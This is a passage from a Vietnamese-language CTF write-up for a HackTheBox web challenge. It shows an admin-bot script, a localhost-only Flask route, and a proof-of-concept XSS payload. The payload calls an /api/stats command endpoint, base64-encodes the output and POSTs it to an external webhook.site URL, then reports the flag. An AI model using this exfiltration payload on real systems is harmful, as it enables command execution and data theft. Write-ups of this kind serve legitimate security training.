+    options.add_argument(&quot;--disable-translate&quot;)
+    options.add_argument(&quot;--hide-scrollbars&quot;)
+    options.add_argument(&quot;--metrics-recording-only&quot;)
+    options.add_argument(&quot;--mute-audio&quot;)
+    options.add_argument(&quot;--no-first-run&quot;)
+    options.add_argument(&quot;--dns-prefetch-disable&quot;)
+    options.add_argument(&quot;--safebrowsing-disable-auto-update&quot;)
+    options.add_argument(&quot;--media-cache-size=1&quot;)
+    options.add_argument(&quot;--disk-cache-size=1&quot;)
+    options.add_argument(&quot;--user-agent=HTB/1.0&quot;)
+
+    service = Service(executable_path=&quot;/usr/bin/chromedriver&quot;)
+    browser = webdriver.Chrome(service=service, options=options)
+
+    browser.get(f&quot;{HOST}/addresses&quot;)
+    time.sleep(5)
+    browser.quit()
+</code></pre><ul>
+<li>Sử dụng <code>selenium</code> truy cập vào <code>browser.get(f&quot;{HOST}/addresses&quot;)</code> bằng việc mở chrome.</li>
+<li>Đây là api /addresses:</li>
+</ul>
+<pre><code>@app.route(&quot;/addresses&quot;, methods=[&quot;GET&quot;])
+def all_addresses():
+    remote_address = request.remote_addr
+    if remote_address != &quot;127.0.0.1&quot; and remote_address != &quot;::1&quot;:
+        return render_template(&quot;index.html&quot;, message=&quot;Only localhost allowed&quot;)
+
+    return render_template(&quot;addresses.html&quot;, addresses=addresses)
+</code></pre><ul>
+<li>Check localhost và đương nhiên là qua -&gt; render teamplate <code>addresses.html</code> với mảng <code>return render_template(&quot;addresses.html&quot;, addresses=addresses)</code></li>
+</ul>
+<h3 id="flow-3">Flow</h3>
+<ul>
+<li>Hướng sẽ là xss để get đến <code>/api/stats</code> sau đó chạy command <code>cat /flag.txt</code> sau đó trả ra kết quả ở bên ngoài.</li>
+</ul>
+<h3 id="exploit-2">Exploit</h3>
+<p>POC:</p>
+<pre><code>fetch('http://localhost:1337/api/stats?command=ls+/')
+  .then((response) =&gt; response.text())
+  .then((data) =&gt; {
+    // Convert the data to base64
+    const base64Data = btoa(data);
+
+    // Send the base64-encoded data to your server using a POST request
+    fetch('https://webhook.site/14c97bf2-8cd5-4527-8f54-856f5729b95c', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'text/plain', // Set the appropriate content type for base64 data
+      },
+      body: base64Data, // Send the base64-encoded data as the request body
+    })
+    .then((response) =&gt; {
+      if (response.ok) {
+        console.log('Response data sent to your server successfully.');
+      } else {
+        console.error('Failed to send data to your server. Status:', response.status);
+      }
+    })
+    .catch((error) =&gt; {
+      console.error('Error:', error);
+    });
+  })
+  .catch((error) =&gt; {
+    console.error('Error fetching data from localhost:', error);
+  });
+
+</code></pre><p><img src="https://hackmd.io/_uploads/BJ8tSq5IA.png" alt="image">
+<img src="https://hackmd.io/_uploads/rJ32rc5IR.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/H16Trqq8C.png" alt="image"></p>
+<ul>
+<li>Flag nằm ở <code>/flage7c47cd9fa.txt</code></li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/BkxGU9cIC.png" alt="image"></p>
+<p>flag : <code>HTB{th3_m1s5i0n_f0r_4_fre3_tr34t}</code></p>
+
+
+        
+          <div class="blog-tags">
+            
+              
+              <a href="https://bzoltan1.github.io/tags/ctf/">CTF</a>&nbsp;
+            
+              
+              <a href="https://bzoltan1.github.io/tags/vietnamese/">Vietnamese</a>&nbsp;
+            
+          </div>
+        
+
+        
+
+        
+      </article>
+
+      
+        <ul class="pager blog-pager">
+          
+            <li class="previous">
+              <a href="https://bzoltan1.github.io/write-up/2024-08-21-hackthebox-web-challpart2/" data-toggle="tooltip" data-placement="top" title="Htb web chall ctf 2024 - solved challenges - part 2">&larr; Previous Post</a>
+            </li>
+          
+          
+            <li class="next">
+              <a href="https://bzoltan1.github.io/write-up/2024-05-18-htbbusinessctf2024/" data-toggle="tooltip" data-placement="top" title="Htb business ctf 2024 the vault of hope - solved challenges in time">Next Post &rarr;</a>
+            </li>
+          
+        </ul>
+      
+
+
+      
+
+    </div>
+  </div>
+</div>
+
+      <footer>
+  <div class="container">
+    
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          
+
+          &nbsp;&bull;&nbsp;&copy;
+          
+            0001
+          
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="https://bzoltan1.github.io/">Zoltán&#39;s Blog</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          <a href="https://gohugo.io">Hugo v0.83.1</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.js" integrity="sha384-G0zcxDFp5LWZtDuRMnBkk3EphCK1lhEf4UEyEM693ka574TZGwo4IWwS6QLzM/2t" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+<script src="https://code.jquery.com/jquery-3.7.0.slim.min.js" integrity="sha384-w5y/xIeYixWvfM+A1cEbmHPURnvyqmVg5eVENruEdDjcyRLUSNej7512JQGspFUr" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>
+
+<script src="https://bzoltan1.github.io/js/main.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://bzoltan1.github.io/js/load-photoswipe.js"></script>
+
+
+
+
+
+
+
+
+
+
+    
+  </body>
+</html>
+
